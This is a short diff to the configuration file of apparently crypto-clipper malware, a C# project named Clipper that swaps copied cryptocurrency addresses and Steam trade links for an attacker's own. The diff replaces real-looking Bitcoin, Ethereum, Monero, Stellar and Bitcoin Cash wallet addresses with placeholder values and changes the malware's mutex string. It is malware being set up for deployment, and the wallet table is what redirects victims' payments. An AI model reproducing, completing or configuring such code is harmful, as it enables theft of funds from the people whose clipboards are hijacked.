@@ -32,14 +32,14 @@ namespace Clipper
             // Steam trade url
             {"steam", "" },
             // Cryptocurrency
-            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
-            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
-            {"xmr", "42747pT2PCYYUszYvdQH5XDNkFieRk2THJ6hdC1vWGN5VTFdx4CWKRpYqevFKZQXTcFfAbKEqoFwGBkHCbq3GVHCNVbZxRd" }, // Monero
-            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
+            {"btc", "1" }, // Bitcoin
+            {"eth", "2" }, // Ethereum
+            {"xmr", "3" }, // Monero
+            {"xlm", "4" }, // Stellar
             {"xrp", "" }, // Ripple
             {"ltc", "" }, // Litecoin
             {"nec", "" }, // Neocoin
-            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
+            {"bch", "" }, // Bitcoin Cash
             {"bcn", "" }, // Bytecoin
             {"ada", "" }, // Cardano
             {"grft", "" }, // Graft
@@ -58,7 +58,7 @@ namespace Clipper
         };
 
         // Mutex (random)
-        public static string mutex = "a111sfrewrfwerewsf231";
+        public static string mutex = "BFGDER3DSFQ2FGG5";
 
     }
 }
